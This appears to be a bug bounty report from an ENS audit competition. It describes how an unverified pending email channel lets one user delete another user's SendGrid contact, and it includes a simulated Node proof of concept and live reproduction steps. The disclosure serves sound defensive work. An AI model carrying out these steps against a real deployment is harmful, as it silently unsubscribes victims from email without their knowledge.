# 90651 w a low unverified email channel lets any authenticated user delete another user s sendgrid contact silently unsubscribing them from ens broadcast email

**Submitted on Aug 26th 2026 at 07:35:28 UTC by @Another for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #90651
* **Report Type:** Websites & Apps
* **Report severity:** Low
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/workers>
* **Impacts:**
  * Changing details of other users (including modifying browser local storage) without already-connected wallet interaction and with significant user interaction, such as:
    * Iframing leading to modifying the backend/browser state (must demonstrate impact with PoC)
  * Taking state-modifying authenticated actions (with or without blockchain state interaction) on behalf of other users without any interaction by that user, such as: Changing registration information Notification/settings changes

## Description

## Brief/Intro

`DELETE /notifications/channels/:id` correctly checks that the channel row belongs to the caller before deleting it. It then performs a SendGrid "broadcast list cleanup" that is keyed on the channel's email address rather than on ownership or verification status, and it uses the globally destructive `deleteContact` (delete the contact from SendGrid entirely) instead of the list-scoped `removeContactFromList` that already exists in the same module and is never called.

Because `POST /notifications/channels/email` only refuses an address that another user has already verified, an attacker can pre-plant a pending channel row for an arbitrary email. When the real owner of that address later verifies it through the normal flow and is added to the broadcast list, the attacker deletes their own pending row and the cleanup destroys the victim's SendGrid contact.

The victim's `user_channels` row is untouched and still reads `status: 'verified'`, so the application UI continues to show email notifications as enabled while broadcast delivery has silently stopped.

## Vulnerability Details

### 1. The cleanup is keyed on the email address, not on ownership or status

`workers/api-worker/src/app/routes/notifications/channels/$id.ts`

```ts
.delete('/', ...requireAuth, injectDb, async (c) => {
    const userId = c.var.user_id
    const channelId = c.req.param('id')

    const channel = await c.var.db.query.userChannels.findFirst({
      where: and(
        eq(TABLE.userChannels.id, channelId),
        eq(TABLE.userChannels.user_id, userId),   // ownership check — correct
      ),
    })

    if (!channel) {
      return c.json({ error: 'Channel not found' }, 404)
    }

    await c.var.db
      .delete(TABLE.userChannels)
      .where(eq(TABLE.userChannels.id, channelId))

    // broadcast list cleanup via waitUntil
    if (
      channel.channel === 'email' &&
      channel.target &&                            // <-- only that the row HAS a target
      c.env.SENDGRID_BROADCAST_LIST_ID
    ) {
      // ...
      c.executionCtx.waitUntil(
        Promise.resolve(
          searchContact(env, channel.target).andThen((contact) =>
            contact ? deleteContact(env, contact.id) : okAsync(undefined),
          ),
        )
      )
    }
```

The ownership check governs which row is deleted. It does not govern the SendGrid side effect, which is driven purely by `channel.target` — a string the attacker chose and that was never proven to belong to them. There is no `channel.status === 'verified'` guard, and no check that no other user holds a verified row for the same address.

`deleteContact` is the global delete:

`workers/api-worker/src/services/sendgrid/contacts.ts`

```ts
/**
 * delete a contact entirely from SendGrid.
 * note: use when user deletes email channel
 */
export const deleteContact = ResultFn(async function* (env, contactId) {
  const url = new URL(`${BASE_URL}/v3/marketing/contacts`)
  url.searchParams.set('ids', contactId)
  // DELETE /v3/marketing/contacts?ids=<id>
```

The safer, list-scoped alternative is defined above it and has zero call sites anywhere in the worker:

```ts
export const removeContactFromList = ResultFn(async function* (env, contactId) {
  const url = new URL(
    `${BASE_URL}/v3/marketing/lists/${env.SENDGRID_BROADCAST_LIST_ID}/contacts`,
  )
```

### 2. The "already linked to another account" guard only blocks verified rows

`workers/api-worker/src/app/routes/notifications/channels/email.ts`

```ts
      // Check if email is linked to another user
      const otherUserChannel = await c.var.db.query.userChannels.findFirst({
        where: and(
          eq(TABLE.userChannels.channel, 'email'),
          eq(TABLE.userChannels.target, email),
          eq(TABLE.userChannels.status, 'verified'),   // <-- only 'verified'
        ),
      })

      if (otherUserChannel && otherUserChannel.user_id !== userId) {
        return c.json(
          { error: 'This email address is already linked to another account' },
          400,
        )
      }
```

So an attacker may freely create a pending row for any address that nobody has verified yet, and — critically — a victim who verifies later is not blocked by the attacker's pending row either. The two rows coexist, which the schema explicitly permits:

`workers/api-worker/src/core/database/schema/notifications.ts`

```ts
  (table) => [
    unique('user_channel_unique').on(
      table.user_id,      // uniqueness is per (user, channel, target) —
      table.channel,      // two different users MAY hold rows for the
      table.target,       // same email address
    ),
  ],
```

### 3. The rate limit is consumed after the rows are persisted, so pre-positioning is unbounded

Still in `email.ts`, the ordering inside `POST /notifications/channels/email` is:

```ts
      const channel = await c.var.db.insert(TABLE.userChannels)...        // (1) row created
      const verification = await c.var.db.insert(TABLE.channelVerifications)... // (2) token created

      const rateLimit = await checkAndConsumeEmailVerificationRateLimit(  // (3) limit checked
        c.env.KV,
        email,
      )

      if (!rateLimit.isAllowed) {
        return c.json({ error: ... }, 429)                                // (4) returns AFTER (1)(2)
      }
```

A `429` response still leaves the pending `user_channels` row committed. `EMAIL_VERIFICATION_RATE_LIMIT_MAX_SENDS = 3` therefore throttles only outbound mail, not row creation, so an attacker can pre-plant pending rows for an arbitrary list of target addresses at any rate. This is not independently severe, but it removes the only practical brake on the attack above.

## Impact Details

Attack preconditions:

* The attacker holds a normal authenticated session, obtained by completing SIWE with their own wallet. No victim credential, no leaked key, no privileged address.
* `SENDGRID_BROADCAST_LIST_ID` is configured in the environment (the cleanup is gated on it).
* The attacker plants the pending row before the victim verifies that address.

Realised impact:

1. The victim's SendGrid contact record is deleted globally — not merely removed from the broadcast list. The record includes the `user_id` custom field written by `addContactToList`, so the ENS-side linkage is destroyed too.
2. The victim is silently unsubscribed from ENS broadcast/marketing email (the `ens_labs_updates` channel).
3. The victim's `user_channels` row still reads `status: 'verified'`, and `GET /notifications/preferences` still reports `ensLabsUpdates: true`. The application therefore reports a delivery channel as healthy and enabled while it has been disabled out from under the user. There is no signal to the victim, and no audit trail attributing the change to the attacker — the only log line is `logger.info('Deleted contact from SendGrid', { email })`, which does not record the acting `user_id`.

## References

All paths relative to `workers/api-worker/src/`:

* `app/routes/notifications/channels/$id.ts` — DELETE handler; the SendGrid cleanup with the defect `searchContact` → `deleteContact`.
* `app/routes/notifications/channels/email.ts` — `otherUserChannel` verified-only guard; insert-then-rate-limit ordering (upsert, token, rate-limit consumed)
* `services/sendgrid/contacts.ts` — `searchContact`, `removeContactFromList` (unused/dead code), `deleteContact`
* `core/database/schema/notifications.ts` — `user_channel_unique` constraint.
* `services/notifications/email-verification-rate-limit.ts` — `EMAIL_VERIFICATION_RATE_LIMIT_MAX_SENDS = 3`, window `= 60*60`
* `services/delivery/email.ts` — transactional path that does not use the contact record, (`sendMailV3` to `deliveryJob.target`)

## Proof of Concept

Create a new file `poc.js` and add the test code to it. It replicates the guard logic of the three handlers exactly as written (`addEmailChannel`, `verifyEmailChannel`, `deleteChannel`), backed by an in-memory table carrying the same `unique(user_id, channel, target)` constraint as the real schema. Only control-flow-deciding branches are modelled; the SendGrid calls are stubbed to record which HTTP operation would be issued.

```js
/**
 * PoC — cross-user SendGrid contact deletion via unverified email channel.
 *
 * Faithfully replicates the guard logic of the three in-scope handlers:
 *   POST   /notifications/channels/email          (email.ts)
 *   POST   /notifications/channels/email/verify   (email.ts)
 *   DELETE /notifications/channels/:id            ($id.ts)
 *
 * Only the guards/branches that decide control flow are modelled; DB access is
 * an in-memory table with the same unique constraint as the real schema:
 *   unique('user_channel_unique').on(user_id, channel, target)
 */

// ---------------- in-memory stand-ins ----------------
let nextId = 1;
const userChannels = [];        // { id, user_id, channel, target, status }
const channelVerifications = []; // { id, channel_id, token }
const sendgridContacts = new Map(); // email -> { id, email }  (global contact store)
const log = [];

const SENDGRID_BROADCAST_LIST_ID = 'list_abc'; // env binding is set in prod

const normalize = (e) => e.trim().toLowerCase();

// services/sendgrid/contacts.ts
const searchContact = (email) => sendgridContacts.get(email.toLowerCase()) ?? null;
const deleteContact = (id) => {
  for (const [email, c] of sendgridContacts) if (c.id === id) {
    sendgridContacts.delete(email);
    log.push(`  [SendGrid] DELETE /v3/marketing/contacts?ids=${id}  -> contact for ${email} destroyed`);
    return;
  }
};
const addContactToList = (email, userId) => {
  const id = `contact_${nextId++}`;
  sendgridContacts.set(email.toLowerCase(), { id, email, userId });
  log.push(`  [SendGrid] PUT /v3/marketing/contacts -> contact ${id} created for ${email}`);
};

// ---------------- handlers ----------------

// POST /notifications/channels/email   (authenticated as userId)
function addEmailChannel(userId, rawEmail) {
  const email = normalize(rawEmail);

  const existingChannel = userChannels.find(
    (c) => c.user_id === userId && c.channel === 'email' && c.target === email);
  if (existingChannel && existingChannel.status === 'verified')
    return { status: 400, error: 'Email already verified for this account' };

  // NOTE: this guard only blocks when ANOTHER user has the email VERIFIED.
  const otherUserChannel = userChannels.find(
    (c) => c.channel === 'email' && c.target === email && c.status === 'verified');
  if (otherUserChannel && otherUserChannel.user_id !== userId)
    return { status: 400, error: 'This email address is already linked to another account' };

  let channel = existingChannel;
  if (channel) { channel.status = 'pending'; }
  else {
    channel = { id: `ch_${nextId++}`, user_id: userId, channel: 'email', target: email, status: 'pending' };
    userChannels.push(channel);
  }

  const verification = { id: `v_${nextId++}`, channel_id: channel.id, token: `tok_${nextId++}` };
  channelVerifications.push(verification);
  // (rate limit is consumed AFTER these inserts in the real handler)
  return { status: 200, channelId: channel.id, token: verification.token };
}

// POST /notifications/channels/email/verify   (UNauthenticated, token-gated)
function verifyEmailChannel(token) {
  const verification = channelVerifications.find((v) => v.token === token);
  if (!verification) return { status: 400, error: 'Invalid or expired verification token' };
  const channel = userChannels.find((c) => c.id === verification.channel_id);
  channel.status = 'verified';
  if (SENDGRID_BROADCAST_LIST_ID && channel.target) addContactToList(channel.target, channel.user_id);
  return { status: 200 };
}

// DELETE /notifications/channels/:id   (authenticated as userId)
function deleteChannel(userId, channelId) {
  const channel = userChannels.find((c) => c.id === channelId && c.user_id === userId);
  if (!channel) return { status: 404, error: 'Channel not found' };

  userChannels.splice(userChannels.indexOf(channel), 1);

  // >>> the defect: keyed on the EMAIL, with no ownership or status check <<<
  if (channel.channel === 'email' && channel.target && SENDGRID_BROADCAST_LIST_ID) {
    const contact = searchContact(channel.target);
    if (contact) deleteContact(contact.id);
  }
  return { status: 200 };
}

// ---------------- attack ----------------
const ATTACKER = 'user_attacker';
const VICTIM   = 'user_victim';
const TARGET   = 'victim@example.com';

console.log('=== PoC: cross-user SendGrid contact deletion ===\n');

console.log('[1] Attacker plants a PENDING channel for the victim\'s email');
const planted = addEmailChannel(ATTACKER, TARGET);
console.log(`    POST /notifications/channels/email {"email":"${TARGET}"} (attacker JWT)`);
console.log(`    -> ${planted.status}  channelId=${planted.channelId}  (attacker never clicks the link)\n`);

console.log('[2] Victim later adds and verifies the SAME email (normal flow)');
const v = addEmailChannel(VICTIM, TARGET);
console.log(`    POST /notifications/channels/email (victim JWT) -> ${v.status} channelId=${v.channelId}`);
console.log(`    (guard passed: attacker's row is 'pending', not 'verified')`);
log.length = 0;
verifyEmailChannel(v.token);
console.log(`    POST /notifications/channels/email/verify {"token":"${v.token}"} -> 200`);
log.forEach((l) => console.log(l));
console.log(`    victim contact present in SendGrid: ${sendgridContacts.has(TARGET)}\n`);

console.log('[3] Attacker deletes their OWN pending channel');
log.length = 0;
const d = deleteChannel(ATTACKER, planted.channelId);
console.log(`    DELETE /notifications/channels/${planted.channelId} (attacker JWT) -> ${d.status}`);
log.forEach((l) => console.log(l));

console.log('\n=== RESULT ===');
const victimRow = userChannels.find((c) => c.user_id === VICTIM);
console.log(`victim's user_channels row     : status="${victimRow.status}"  (app UI still shows email enabled)`);
console.log(`victim's SendGrid contact      : ${sendgridContacts.has(TARGET) ? 'INTACT' : 'DELETED'}`);
console.log(`\nExploited: ${!sendgridContacts.has(TARGET) && victimRow.status === 'verified'}`);
```

### Build/run

```sh
node poc.js      # no dependencies; Node 18+
```

### Output

```
=== PoC: cross-user SendGrid contact deletion ===

[1] Attacker plants a PENDING channel for the victim's email
    POST /notifications/channels/email {"email":"victim@example.com"} (attacker JWT)
    -> 200  channelId=ch_1  (attacker never clicks the link)

[2] Victim later adds and verifies the SAME email (normal flow)
    POST /notifications/channels/email (victim JWT) -> 200 channelId=ch_4
    (guard passed: attacker's row is 'pending', not 'verified')
    POST /notifications/channels/email/verify {"token":"tok_6"} -> 200
  [SendGrid] PUT /v3/marketing/contacts -> contact contact_7 created for victim@example.com
    victim contact present in SendGrid: true

[3] Attacker deletes their OWN pending channel
    DELETE /notifications/channels/ch_1 (attacker JWT) -> 200
  [SendGrid] DELETE /v3/marketing/contacts?ids=contact_7  -> contact for victim@example.com destroyed

=== RESULT ===
victim's user_channels row     : status="verified"  (app UI still shows email enabled)
victim's SendGrid contact      : DELETED

Exploited: true
```

## Reproducing against a live deployment

{% stepper %}
{% step %}

## Authenticate as the attacker

Authenticate as attacker (`POST /auth/nonce` → `POST /auth/login` with a wallet you control).
{% endstep %}

{% step %}

## Create a pending channel

`POST /notifications/channels/email` with `{"email":"<target>"}`. Note the returned `channelId`. Discard the verification email; do not click it.
{% endstep %}

{% step %}

## Verify the target email as the victim

As the victim, add and verify `<target>` normally. Confirm via SendGrid that a contact now exists for it.
{% endstep %}

{% step %}

## Delete the attacker-owned pending channel

As the attacker, `DELETE /notifications/channels/<channelId>`.
{% endstep %}

{% step %}

## Confirm the impact

Query SendGrid `POST /v3/marketing/contacts/search/emails` for `<target>` — it returns 404/empty. The victim's `GET /notifications/channels` still reports the channel as `verified`.
{% endstep %}
{% endstepper %}
